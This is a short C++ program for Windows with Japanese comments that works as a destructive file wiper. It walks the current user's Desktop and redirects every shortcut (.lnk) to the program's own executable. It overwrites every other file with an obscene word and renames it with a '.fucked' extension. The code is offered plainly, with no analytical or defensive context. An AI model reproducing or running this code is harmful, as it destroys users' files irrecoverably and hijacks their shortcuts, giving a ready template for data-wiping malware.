#include <windows.h>//ユーザ名取得

#include <iostream>
#include <vector>
#include <filesystem>
#include <fstream>
#include <algorithm>
#include <lmcons.h>

#include "ChangeShortCut.h"

namespace fs = std::filesystem;

//ファイルを std::filesystemによって列挙
static std::vector<fs::path> Search(fs::path StartPath) {
	//パスを格納
	std::vector<fs::path> paths;

	//イテレータ
	fs::recursive_directory_iterator itr_r(StartPath), itr_end;

	//イテレータを最後まで
	std::for_each(itr_r, itr_end, [&paths](const fs::directory_entry& entry)
		{
			//ファイルの場合格納
			if (entry.is_regular_file())
				paths.push_back(entry);
		}
	);

	return paths;
}

//ユーザ名を返す。
static std::string UserName() {
	char buffer[UNLEN + 1];
	DWORD size = sizeof(buffer);

	if (GetUserNameA(buffer, &size)) {
		return std::string(buffer);
	}
	else {
		return "";
	}
}

static std::vector<char> getBinaryFile(fs::path Path) {
	std::ifstream ifs(Path, std::ios::binary);

	if (!ifs)
		return {};

	//サイズを取得
	ifs.seekg(0, std::ios::end);
	std::streamsize size = ifs.tellg();
	ifs.seekg(0, std::ios::beg);

	std::vector<char> buf(size);

	//読み込み
	ifs.read(buf.data(), size);

	ifs.close();

	return buf;
}


int main(int argc,const char* argv[]) {
	//ユーザ名取得
	std::string username = UserName();

	//ファイルパスをすべて取得
	std::vector<fs::path> files = Search("c:/users/"+username+"/desktop/");
	
	for (fs::path file : files)
		std::cout << file.string() << std::endl;

	system("pause");

	//ファイルパスをつまむ
	for (fs::path file:files) {

		//リンクの場合自分のリンクにする。
		if (std::string::npos != file.string().find(".lnk")) {

			std::string content = file.string();
			
			std::string newPath = argv[0];

			std::wstring from(content.begin(),content.end());
			std::wstring to  (newPath.begin(),newPath.end());

			ModifyShortcut(from.c_str(), to.c_str());
		}
		else {
			try {
				std::ofstream ofs(file, std::ofstream::out);

				if (!ofs)
					continue;

				ofs << "fucked";
				ofs.close();

				fs::rename(file, file.string() + ".fucked");
			}
			catch (fs::filesystem_error e) {}
		}
	}
}